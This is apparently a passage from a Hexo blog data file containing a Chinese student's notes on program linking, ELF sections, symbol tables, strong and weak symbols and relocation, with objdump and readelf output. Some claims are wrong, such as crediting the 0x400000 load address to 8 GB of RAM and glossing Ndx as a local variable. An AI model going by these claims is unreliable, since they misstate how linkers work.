目标文件格式\nELF格式\n每个可执行文件都有一个ELF头，里面包括着可执行文件的信息。\n#### ELF头\n![elfImage](elfImage.jpg)\n夹在ELF头和节头部表之间的都是节。一个典型的ELF可重定位目标文件包含下面几个节：\n.text：已编译程序的机器代码。\n.rodata：只读数据，比如printf语句中的格式串和开关（switch）语句的跳转表。\n.data：已初始化的全局C变量。局部C变量在运行时被保存在栈中，既不出现在.data中，也不出现在.bss节中。\n.bss：未初始化的全局C变量。在目标文件中这个节不占据实际的空间，它仅仅是一个占位符。目标文件格式区分初始化和未初始化变量是为了空间效率在：在目标文件中，未初始化变量不需要占据任何实际的磁盘空间。\n.symtab：一个符号表（symbol table），它存放在程序中被定义和引用的函数和全局变量的信息。一些程序员错误地认为必须通过-g选项来编译一个程序，得到符号表信息。实际上，每个可重定位目标文件在.symtab中都有一张符号表。然而，和编译器中的符号表不同，.symtab符号表不包含局部变量的表目。\n.rel.text：当链接噐把这个目标文件和其他文件结合时，.text节中的许多位置都需要修改。一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一方面调用本地函数的指令则不需要修改。注意，可执行目标文件中并不需要重定位信息，因此通常省略，除非使用者显式地指示链接器包含这些信息。\n.rel.data：被模块定义或引用的任何全局变量的信息。一般而言，任何已初始化全局变量的初始值是全局变量或者外部定义函数的地址都需要被修改。\n.debug：一个调试符号表，其有些表目是程序中定义的局部变量和类型定义，有些表目是程序中定义和引用的全局变量，有些是原始的C源文件。只有以-g选项调用编译驱动程序时，才会得到这张表。\n.line：原始C源程序中的行号和.text节中机器指令之间的映射。只有以-g选项调用编译驱动程序时，才会得到这张表。\n.strtab：一个字符串表，其内容包括.symtab和.debug节中的符号表，以及节头部中的节名字。字符串表就是以null结尾的字符串序列。\n旁注：为什么未初始化的数据称为.bss?\n用术语.bss来表示未初始化的数据是很普遍的。它起始于IBM 704汇编语言（大约在1957年）中”块存储开始（Block Storage Start）“指令的首字母缩写，并沿用至今。一个记住区分.data和.bss节的简单方法是把“bss”看成是“更好地节省空间（Better Save Space）！“的缩写。\n#### 符号表和符号解析\n##### 符号表的类型\n1、在模块m中定义冰杯其他模块引用的全局符号\n2、在其他模块定义并且被m引用的外部符号\n3、在模块m中定义并在m中引用的本地符号\n##### 使用readelf -s prog.o查看符号表\n```\nreadelf -s main.o\nSymbol table '.symtab' contains 11 entries:\n   Num:    Value          Size Type    Bind   Vis      Ndx Name\n     8: 0000000000000000     8 OBJECT  GLOBAL DEFAULT    3 buf\n     9: 0000000000000000    16 FUNC    GLOBAL DEFAULT    1 main\n    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND swap\nreadelf -s swap.o\nSymbol table '.symtab' contains 12 entries:\n   Num:    Value          Size Type    Bind   Vis      Ndx Name\n     5: 0000000000000000     8 OBJECT  LOCAL  DEFAULT    5 bufp1\n     9: 0000000000000000     8 OBJECT  GLOBAL DEFAULT    3 bufp0\n    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND buf\n    11: 0000000000000000    60 FUNC    GLOBAL DEFAULT    1 swap\n```\n_GLOBAL位全局变量，LOCAL为局部变量，swap为函数，Ndx位本地变量，UND为undefined_\n##### 符号解析\n##### 全局符号的强弱特性\n定义：函数名和已初始化的全局变量是强符号，未初始化的全局变量是弱符号。\n例如上面的，main,buf,swap,bufp0是 强符号,bufp1位本地符号，本地符号无强弱之分。\n\n多重定义符号处理：\n**规则1：强符号不能多次定义，也即强符号只能被定义一次，否则链接错误\n规则2：若一个符号被说明为一次强符号定义和多个弱符号定义，则按强符号为准\n规则3：若有多个弱符号定义，则任选其中一个**\n##### 强弱符号链接错误解决方案：\n1、尽量避免使用全局符号\n2、把全局符号定义位static，这样就没有强弱之分\n3、尽量要给全局变量赋初值使其变成强符号\n4、外部全局变量尽量使用extern\n#### 重定位\n规则：\n函数调用采用相对重定位\n即使用R_386_PC32:ADDR(r_sym)-((ADDR(.text)+ r_offset) - init)\n全局变量采用绝对重定位\n即使用R_386_32把32位的地址值直接代替\n###### 重定位的工作\n1、节和定义符号的重定位\n2、引用符号的重定位\n#### 链接\n1、静态链接：将用户程序中使用的库文件完整拷贝形成一个完整的可执行文件\n优点：可随时执行文件，可执行文件不会因为库文件丢失而无法执行\n缺点：导致相同库文件多个备份\n2、动态链接：根据代码、数据、重定位和符号表信息，能在执行目标文件是装入或运行被动态的装入内存并自动链接\n优点：减少库文件的多个备份\n缺点：缺少库文件无法运行\n\n\n#### 小结：\n至此，第四章也完成了。这一章主要讲的是生成可执行文件的过程，由最初始的编辑代码，然后将其预编译，编译，汇编，链接，生成可执行文件。这个过程是不仅由我们看到的小黑框那么简单，这段时间还经历着将代码转成汇编，将所定义的全局变量以及函数名称建表，把各个符号通过重定位形成一个最终没有缺失的可执行文件。第四章让我很清晰的清楚可执行文件的生成，也把当初的黑匣子打开，让我更深刻的理解其工作原理。","slug":"basic-computer-sience-chapter4","published":1,"updated":"2021-09-11T05:44:03.795Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz00000e4jzxsdmbtt35","content":"<h4 id=\"什么是程序的链接？\"><a href=\"#什么是程序的链接？\" class=\"headerlink\" title=\"什么是程序的链接？\"></a>什么是程序的链接？</h4><p><em>将gcc生成的若干个.0文件为后缀的，vc输出为.obj为后缀的可重定位目标文件组合起来，生成一个可执行目标文件</em></p><h4 id=\"程序链接的好处：\"><a href=\"#程序链接的好处：\" class=\"headerlink\" title=\"程序链接的好处：\"></a>程序链接的好处：</h4><p>1、模块化(可分成不同模块全部编译成.o文件后链接即可运行。而不仅仅是只有一个.c文件，对于大工程来说清晰划分)<br>2、效率高(由于可以使多个文件同时编写，多个模块同时修改，因此这样提升了效率)</p><h5 id=\"在链接先进行编译和汇编，在第三章聊过\"><a href=\"#在链接先进行编译和汇编，在第三章聊过\" class=\"headerlink\" title=\"在链接先进行编译和汇编，在第三章聊过\"></a>在链接先进行编译和汇编，在第三章聊过</h5><h4 id=\"可执行文件与-o文件的汇编差别在哪？\"><a href=\"#可执行文件与-o文件的汇编差别在哪？\" class=\"headerlink\" title=\"可执行文件与.o文件的汇编差别在哪？\"></a>可执行文件与.o文件的汇编差别在哪？</h4><p>由于可执行文件是将可重定位二进制文件重新组合，因此其自身的虚拟地址转化为了逻辑地址,如下<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// test.c</span><br><span class=\"line\">int main(int i,int j)&#123;</span><br><span class=\"line\">\tint x = i+j;</span><br><span class=\"line\">\treturn x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//使用objdump -d test.o反汇编出来的.o文件</span><br><span class=\"line\">// test.o</span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\">0000000000000000 &lt;main&gt;:</span><br><span class=\"line\">   0:\t55                   \tpush   %rbp       </span><br><span class=\"line\">   1:\t48 89 e5             \tmov    %rsp,%rbp</span><br><span class=\"line\">   4:\t89 7d ec             \tmov    %edi,-0x14(%rbp)</span><br><span class=\"line\">   7:\t89 75 e8             \tmov    %esi,-0x18(%rbp)</span><br><span class=\"line\">   a:\t8b 55 ec             \tmov    -0x14(%rbp),%edx</span><br><span class=\"line\">   d:\t8b 45 e8             \tmov    -0x18(%rbp),%eax</span><br><span class=\"line\">  10:\t01 d0                \tadd    %edx,%eax</span><br><span class=\"line\">  12:\t89 45 fc             \tmov    %eax,-0x4(%rbp)</span><br><span class=\"line\">  15:\t8b 45 fc             \tmov    -0x4(%rbp),%eax</span><br><span class=\"line\">  18:\t5d                   \tpop    %rbp</span><br><span class=\"line\">  19:\tc3                   \tretq   </span><br><span class=\"line\">//每个.o文件开头都是以0开始，还没有被链接成位可执行文件，在其内部为虚拟地址</span><br><span class=\"line\">//使用objdump -d test反汇编出来的可执行文件</span><br><span class=\"line\">//test</span><br><span class=\"line\">00000000004004d6 &lt;main&gt;:</span><br><span class=\"line\">  4004d6:\t55                   \tpush   %rbp</span><br><span class=\"line\">  4004d7:\t48 89 e5             \tmov    %rsp,%rbp</span><br><span class=\"line\">  4004da:\t89 7d ec             \tmov    %edi,-0x14(%rbp)</span><br><span class=\"line\">  4004dd:\t89 75 e8             \tmov    %esi,-0x18(%rbp)</span><br><span class=\"line\">  4004e0:\t8b 55 ec             \tmov    -0x14(%rbp),%edx</span><br><span class=\"line\">  4004e3:\t8b 45 e8             \tmov    -0x18(%rbp),%eax</span><br><span class=\"line\">  4004e6:\t01 d0                \tadd    %edx,%eax</span><br><span class=\"line\">  4004e8:\t89 45 fc             \tmov    %eax,-0x4(%rbp)</span><br><span class=\"line\">  4004eb:\t8b 45 fc             \tmov    -0x4(%rbp),%eax</span><br><span class=\"line\">  4004ee:\t5d                   \tpop    %rbp</span><br><span class=\"line\">  4004ef:\tc3                   \tretq   </span><br><span class=\"line\">// 由于我的机子是8g内存，因此开头以400...开头</span><br><span class=\"line\">// test.o与test相比，test经过链接后，将虚拟地址转化成为逻辑地址</span><br></pre></td></tr></table></figure><p></p><h4 id=\"目标文件格式\"><a href=\"#目标文件格式\" class=\"headerlink\" title=\"目标文件格式\"></a>目标文件格式</h4><p>ELF格式<br>每个可执行文件都有一个ELF头，里面包括着可执行文件的信息。</p><h4 id=\"ELF头\"><a href=\"#ELF头\" class=\"headerlink\" title=\"ELF头\"></a>ELF头</h4><p><img src=\"/img/loading.gif\" data-original=\"/计算机系统基础/basic-computer-sience-chapter4/elfImage.jpg\" alt=\"elfImage\"><br>夹在ELF头和节头部表之间的都是节。一个典型的ELF可重定位目标文件包含下面几个节：<br>.text：已编译程序的机器代码。<br>.rodata：只读数据，比如printf语句中的格式串和开关（switch）语句的跳转表。<br>.data：已初始化的全局C变量。局部C变量在运行时被保存在栈中，既不出现在.data中，也不出现在.bss节中。<br>.bss：未初始化的全局C变量。在目标文件中这个节不占据实际的空间，它仅仅是一个占位符。目标文件格式区分初始化和未初始化变量是为了空间效率在：在目标文件中，未初始化变量不需要占据任何实际的磁盘空间。<br>.symtab：一个符号表（symbol table），它存放在程序中被定义和引用的函数和全局变量的信息。一些程序员错误地认为必须通过-g选项来编译一个程序，得到符号表信息。实际上，每个可重定位目标文件在.symtab中都有一张符号表。然而，和编译器中的符号表不同，.symtab符号表不包含局部变量的表目。<br>.rel.text：当链接噐把这个目标文件和其他文件结合时，.text节中的许多位置都需要修改。一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一方面调用本地函数的指令则不需要修改。注意，可执行目标文件中并不需要重定位信息，因此通常省略，除非使用者显式地指示链接器包含这些信息。<br>.rel.data：被模块定义或引用的任何全局变量的信息。一般而言，任何已初始化全局变量的初始值是全局变量或者外部定义函数的地址都需要被修改。<br>.debug：一个调试符号表，其有些表目是程序中定义的局部变量和类型定义，有些表目是程序中定义和引用的全局变量，有些是原始的C源文件。只有以-g选项调用编译驱动程序时，才会得到这张表。<br>.line：原始C源程序中的行号和.text节中机器指令之间的映射。只有以-g选项调用编译驱动程序时，才会得到这张表。<br>.strtab：一个字符串表，其内容包括.symtab和.debug节中的符号表，以及节头部中的节名字。字符串表就是以null结尾的字符串序列。<br>旁注：为什么未初始化的数据称为.bss?<br>用术语.bss来表示未初始化的数据是很普遍的。它起始于IBM 704汇编语言（大约在1957年）中”块存储开始（Block Storage Start）“指令的首字母缩写，并沿用至今。一个记住区分.data和.bss节的简单方法是把“bss”看成是“更好地节省空间（Better Save Space）！“的缩写。</p><h4 id=\"符号表和符号解析\"><a href=\"#符号表和符号解析\" class=\"headerlink\" title=\"符号表和符号解析\"></a>符号表和符号解析</h4><h5 id=\"符号表的类型\"><a href=\"#符号表的类型\" class=\"headerlink\" title=\"符号表的类型\"></a>符号表的类型</h5><p>1、在模块m中定义冰杯其他模块引用的全局符号<br>2、在其他模块定义并且被m引用的外部符号<br>3、在模块m中定义并在m中引用的本地符号</p><h5 id=\"使用readelf-s-prog-o查看符号表\"><a href=\"#使用readelf-s-prog-o查看符号表\" class=\"headerlink\" title=\"使用readelf -s prog.o查看符号表\"></a>使用readelf -s prog.o查看符号表</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readelf -s main.o</span><br><span class=\"line\">Symbol table &apos;.symtab&apos; contains 11 entries:</span><br><span class=\"line\">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class=\"line\">     8: 0000000000000000     8 OBJECT  GLOBAL DEFAULT    3 buf</span><br><span class=\"line\">     9: 0000000000000000    16 FUNC    GLOBAL DEFAULT    1 main</span><br><span class=\"line\">    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND swap</span><br><span class=\"line\">readelf -s swap.o</span><br><span class=\"line\">Symbol table &apos;.symtab&apos; contains 12 entries:</span><br><span class=\"line\">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class=\"line\">     5: 0000000000000000     8 OBJECT  LOCAL  DEFAULT    5 bufp1</span><br><span class=\"line\">     9: 0000000000000000     8 OBJECT  GLOBAL DEFAULT    3 bufp0</span><br><span class=\"line\">    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND buf</span><br><span class=\"line\">    11: 0000000000000000    60 FUNC    GLOBAL DEFAULT    1 swap</span><br></pre></td></tr></table></figure><p><em>GLOBAL位全局变量，LOCAL为局部变量，swap为函数，Ndx位本地变量，UND为undefined</em></p><h5 id=\"符号解析\"><a href=\"#符号解析\" class=\"headerlink\" title=\"符号解析\"></a>符号解析</h5><h5 id=\"全局符号的强弱特性\"><a href=\"#全局符号的强弱特性\" class=\"headerlink\" title=\"全局符号的强弱特性\"></a>全局符号的强弱特性</h5><p>定义：函数名和已初始化的全局变量是强符号，未初始化的全局变量是弱符号。<br>例如上面的，main,buf,swap,bufp0是 强符号,bufp1位本地符号，本地符号无强弱之分。</p><p>多重定义符号处理：<br><strong>规则1：强符号不能多次定义，也即强符号只能被定义一次，否则链接错误<br>规则2：若一个符号被说明为一次强符号定义和多个弱符号定义，则按强符号为准<br>规则3：若有多个弱符号定义，则任选其中一个</strong></p><h5 id=\"强弱符号链接错误解决方案：\"><a href=\"#强弱符号链接错误解决方案：\" class=\"headerlink\" title=\"强弱符号链接错误解决方案：\"></a>强弱符号链接错误解决方案：</h5><p>1、尽量避免使用全局符号<br>2、把全局符号定义位static，这样就没有强弱之分<br>3、尽量要给全局变量赋初值使其变成强符号<br>4、外部全局变量尽量使用extern</p><h4 id=\"重定位\"><a href=\"#重定位\" class=\"headerlink\" title=\"重定位\"></a>重定位</h4><p>规则：<br>函数调用采用相对重定位<br>即使用R_386_PC32:ADDR(r_sym)-((ADDR(.text)+ r_offset) - init)<br>全局变量采用绝对重定位<br>即使用R_386_32把32位的地址值直接代替</p><h6 id=\"重定位的工作\"><a href=\"#重定位的工作\" class=\"headerlink\" title=\"重定位的工作\"></a>重定位的工作</h6><p>1、节和定义符号的重定位<br>2、引用符号的重定位</p><h4 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" title=\"链接\"></a>链接</h4><p>1、静态链接：将用户程序中使用的库文件完整拷贝形成一个完整的可执行文件<br>优点：可随时执行文件，可执行文件不会因为库文件丢失而无法执行<br>缺点：导致相同库文件多个备份<br>2、动态链接：根据代码、数据、重定位和符号表信息，能在执行目标文件是装入或运行被动态的装入内存并自动链接<br>优点：减少库文件的多个备份<br>缺点：缺少库文件无法运行</p><h4 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h4><p>至此，第四章也完成了。这一章主要讲的是生成可执行文件的过程，由最初始的编辑代码，然后将其预编译，编译，汇编，链接，生成可执行文件。这个过程是不仅由我们看到的小黑框那么简单，这段时间还经历着将代码转成汇编，将所定义的全局变量以及函数名称建表，把各个符号通过重定位形成一个最终没有缺失的可执行文件。第四章让我很清晰的清楚可执行文件的生成，也把当初的黑匣子打开，让我更深刻的理解其工作原理。</p>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"什么是程序的链接？\"><a href=\"#什么是程序的链接？\" class=\"headerlink\" title=\"什么是程序的链接？\"></a>什么是程序的链接？</h4><p><em>将gcc生成的若干个.0文件为后缀的，vc输出为.obj为后缀的可重定位目标文件组合起来，生成一个可执行目标文件</em></p><h4 id=\"程序链接的好处：\"><a href=\"#程序链接的好处：\" class=\"headerlink\" title=\"程序链接的好处：\"></a>程序链接的好处：</h4><p>1、模块化(可分成不同模块全部编译成.o文件后链接即可运行。而不仅仅是只有一个.c文件，对于大工程来说清晰划分)<br>2、效率高(由于可以使多个文件同时编写，多个模块同时修改，因此这样提升了效率)</p><h5 id=\"在链接先进行编译和汇编，在第三章聊过\"><a href=\"#在链接先进行编译和汇编，在第三章聊过\" class=\"headerlink\" title=\"在链接先进行编译和汇编，在第三章聊过\"></a>在链接先进行编译和汇编，在第三章聊过</h5><h4 id=\"可执行文件与-o文件的汇编差别在哪？\"><a href=\"#可执行文件与-o文件的汇编差别在哪？\" class=\"headerlink\" title=\"可执行文件与.o文件的汇编差别在哪？\"></a>可执行文件与.o文件的汇编差别在哪？</h4><p>由于可执行文件是将可重定位二进制文件重新组合，因此其自身的虚拟地址转化为了逻辑地址,如下<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// test.c</span><br><span class=\"line\">int main(int i,int j)&#123;</span><br><span class=\"line\">\tint x = i+j;</span><br><span class=\"line\">\treturn x;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//使用objdump -d test.o反汇编出来的.o文件</span><br><span class=\"line\">// test.o</span><br><span class=\"line\">Disassembly of section .text:</span><br><span class=\"line\">0000000000000000 &lt;main&gt;:</span><br><span class=\"line\">   0:\t55                   \tpush   %rbp       </span><br><span class=\"line\">   1:\t48 89 e5             \tmov    %rsp,%rbp</span><br><span class=\"line\">   4:\t89 7d ec             \tmov    %edi,-0x14(%rbp)</span><br><span class=\"line\">   7:\t89 75 e8             \tmov    %esi,-0x18(%rbp)</span><br><span class=\"line\">   a:\t8b 55 ec             \tmov    -0x14(%rbp),%edx</span><br><span class=\"line\">   d:\t8b 45 e8             \tmov    -0x18(%rbp),%eax</span><br><span class=\"line\">  10:\t01 d0                \tadd    %edx,%eax</span><br><span class=\"line\">  12:\t89 45 fc             \tmov    %eax,-0x4(%rbp)</span><br><span class=\"line\">  15:\t8b 45 fc             \tmov    -0x4(%rbp),%eax</span><br><span class=\"line\">  18:\t5d                   \tpop    %rbp</span><br><span class=\"line\">  19:\tc3                   \tretq   </span><br><span class=\"line\">//每个.o文件开头都是以0开始，还没有被链接成位可执行文件，在其内部为虚拟地址</span><br><span class=\"line\">//使用objdump -d test反汇编出来的可执行文件</span><br><span class=\"line\">//test</span><br><span class=\"line\">00000000004004d6 &lt;main&gt;:</span><br><span class=\"line\">  4004d6:\t55                   \tpush   %rbp</span><br><span class=\"line\">  4004d7:\t48 89 e5             \tmov    %rsp,%rbp</span><br><span class=\"line\">  4004da:\t89 7d ec             \tmov    %edi,-0x14(%rbp)</span><br><span class=\"line\">  4004dd:\t89 75 e8             \tmov    %esi,-0x18(%rbp)</span><br><span class=\"line\">  4004e0:\t8b 55 ec             \tmov    -0x14(%rbp),%edx</span><br><span class=\"line\">  4004e3:\t8b 45 e8             \tmov    -0x18(%rbp),%eax</span><br><span class=\"line\">  4004e6:\t01 d0                \tadd    %edx,%eax</span><br><span class=\"line\">  4004e8:\t89 45 fc             \tmov    %eax,-0x4(%rbp)</span><br><span class=\"line\">  4004eb:\t8b 45 fc             \tmov    -0x4(%rbp),%eax</span><br><span class=\"line\">  4004ee:\t5d                   \tpop    %rbp</span><br><span class=\"line\">  4004ef:\tc3                   \tretq   </span><br><span class=\"line\">// 由于我的机子是8g内存，因此开头以400...开头</span><br><span class=\"line\">// test.o与test相比，test经过链接后，将虚拟地址转化成为逻辑地址</span><br></pre></td></tr></table></figure><p></p><h4 id=\"目标文件格式\"><a href=\"#目标文件格式\" class=\"headerlink\" title=\"目标文件格式\"></a>目标文件格式</h4><p>ELF格式<br>每个可执行文件都有一个ELF头，里面包括着可执行文件的信息。</p><h4 id=\"ELF头\"><a href=\"#ELF头\" class=\"headerlink\" title=\"ELF头\"></a>ELF头</h4><p><img src=\"/计算机系统基础/basic-computer-sience-chapter4/elfImage.jpg\" alt=\"elfImage\"><br>夹在ELF头和节头部表之间的都是节。一个典型的ELF可重定位目标文件包含下面几个节：<br>.text：已编译程序的机器代码。<br>.rodata：只读数据，比如printf语句中的格式串和开关（switch）语句的跳转表。<br>.data：已初始化的全局C变量。局部C变量在运行时被保存在栈中，既不出现在.data中，也不出现在.bss节中。<br>.bss：未初始化的全局C变量。在目标文件中这个节不占据实际的空间，它仅仅是一个占位符。目标文件格式区分初始化和未初始化变量是为了空间效率在：在目标文件中，未初始化变量不需要占据任何实际的磁盘空间。<br>.symtab：一个符号表（symbol table），它存放在程序中被定义和引用的函数和全局变量的信息。一些程序员错误地认为必须通过-g选项来编译一个程序，得到符号表信息。实际上，每个可重定位目标文件在.symtab中都有一张符号表。然而，和编译器中的符号表不同，.symtab符号表不包含局部变量的表目。<br>.rel.text：当链接噐把这个目标文件和其他文件结合时，.text节中的许多位置都需要修改。一般而言，任何调用外部函数或者引用全局变量的指令都需要修改。另一方面调用本地函数的指令则不需要修改。注意，可执行目标文件中并不需要重定位信息，因此通常省略，除非使用者显式地指示链接器包含这些信息。<br>.rel.data：被模块定义或引用的任何全局变量的信息。一般而言，任何已初始化全局变量的初始值是全局变量或者外部定义函数的地址都需要被修改。<br>.debug：一个调试符号表，其有些表目是程序中定义的局部变量和类型定义，有些表目是程序中定义和引用的全局变量，有些是原始的C源文件。只有以-g选项调用编译驱动程序时，才会得到这张表。<br>.line：原始C源程序中的行号和.text节中机器指令之间的映射。只有以-g选项调用编译驱动程序时，才会得到这张表。<br>.strtab：一个字符串表，其内容包括.symtab和.debug节中的符号表，以及节头部中的节名字。字符串表就是以null结尾的字符串序列。<br>旁注：为什么未初始化的数据称为.bss?<br>用术语.bss来表示未初始化的数据是很普遍的。它起始于IBM 704汇编语言（大约在1957年）中”块存储开始（Block Storage Start）“指令的首字母缩写，并沿用至今。一个记住区分.data和.bss节的简单方法是把“bss”看成是“更好地节省空间（Better Save Space）！“的缩写。</p><h4 id=\"符号表和符号解析\"><a href=\"#符号表和符号解析\" class=\"headerlink\" title=\"符号表和符号解析\"></a>符号表和符号解析</h4><h5 id=\"符号表的类型\"><a href=\"#符号表的类型\" class=\"headerlink\" title=\"符号表的类型\"></a>符号表的类型</h5><p>1、在模块m中定义冰杯其他模块引用的全局符号<br>2、在其他模块定义并且被m引用的外部符号<br>3、在模块m中定义并在m中引用的本地符号</p><h5 id=\"使用readelf-s-prog-o查看符号表\"><a href=\"#使用readelf-s-prog-o查看符号表\" class=\"headerlink\" title=\"使用readelf -s prog.o查看符号表\"></a>使用readelf -s prog.o查看符号表</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readelf -s main.o</span><br><span class=\"line\">Symbol table &apos;.symtab&apos; contains 11 entries:</span><br><span class=\"line\">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class=\"line\">     8: 0000000000000000     8 OBJECT  GLOBAL DEFAULT    3 buf</span><br><span class=\"line\">     9: 0000000000000000    16 FUNC    GLOBAL DEFAULT    1 main</span><br><span class=\"line\">    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND swap</span><br><span class=\"line\">readelf -s swap.o</span><br><span class=\"line\">Symbol table &apos;.symtab&apos; contains 12 entries:</span><br><span class=\"line\">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class=\"line\">     5: 0000000000000000     8 OBJECT  LOCAL  DEFAULT    5 bufp1</span><br><span class=\"line\">     9: 0000000000000000     8 OBJECT  GLOBAL DEFAULT    3 bufp0</span><br><span class=\"line\">    10: 0000000000000000     0 NOTYPE  GLOBAL DEFAULT  UND buf</span><br><span class=\"line\">    11: 0000000000000000    60 FUNC    GLOBAL DEFAULT    1 swap</span><br></pre></td></tr></table></figure><p><em>GLOBAL位全局变量，LOCAL为局部变量，swap为函数，Ndx位本地变量，UND为undefined</em></p><h5 id=\"符号解析\"><a href=\"#符号解析\" class=\"headerlink\" title=\"符号解析\"></a>符号解析</h5><h5 id=\"全局符号的强弱特性\"><a href=\"#全局符号的强弱特性\" class=\"headerlink\" title=\"全局符号的强弱特性\"></a>全局符号的强弱特性</h5><p>定义：函数名和已初始化的全局变量是强符号，未初始化的全局变量是弱符号。<br>例如上面的，main,buf,swap,bufp0是 强符号,bufp1位本地符号，本地符号无强弱之分。</p><p>多重定义符号处理：<br><strong>规则1：强符号不能多次定义，也即强符号只能被定义一次，否则链接错误<br>规则2：若一个符号被说明为一次强符号定义和多个弱符号定义，则按强符号为准<br>规则3：若有多个弱符号定义，则任选其中一个</strong></p><h5 id=\"强弱符号链接错误解决方案：\"><a href=\"#强弱符号链接错误解决方案：\" class=\"headerlink\" title=\"强弱符号链接错误解决方案：\"></a>强弱符号链接错误解决方案：</h5><p>1、尽量避免使用全局符号<br>2、把全局符号定义位static，这样就没有强弱之分<br>3、尽量要给全局变量赋初值使其变成强符号<br>4、外部全局变量尽量使用extern</p><h4 id=\"重定位\"><a href=\"#重定位\" class=\"headerlink\" title=\"重定位\"></a>重定位</h4><p>规则：<br>函数调用采用相对重定位<br>即使用R_386_PC32:ADDR(r_sym)-((ADDR(.text)+ r_offset) - init)<br>全局变量采用绝对重定位<br>即使用R_386_32把32位的地址值直接代替</p><h6 id=\"重定位的工作\"><a href=\"#重定位的工作\" class=\"headerlink\" title=\"重定位的工作\"></a>重定位的工作</h6><p>1、节和定义符号的重定位<br>2、引用符号的重定位</p><h4 id=\"链接\"><a href=\"#链接\" class=\"headerlink\" title=\"链接\"></a>链接</h4><p>1、静态链接：将用户程序中使用的库文件完整拷贝形成一个完整的可执行文件<br>优点：可随时执行文件，可执行文件不会因为库文件丢失而无法执行<br>缺点：导致相同库文件多个备份<br>2、动态链接：根据代码、数据、重定位和符号表信息，能在执行目标文件是装入或运行被动态的装入内存并自动链接<br>优点：减少库文件的多个备份<br>缺点：缺少库文件无法运行</p><h4 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" 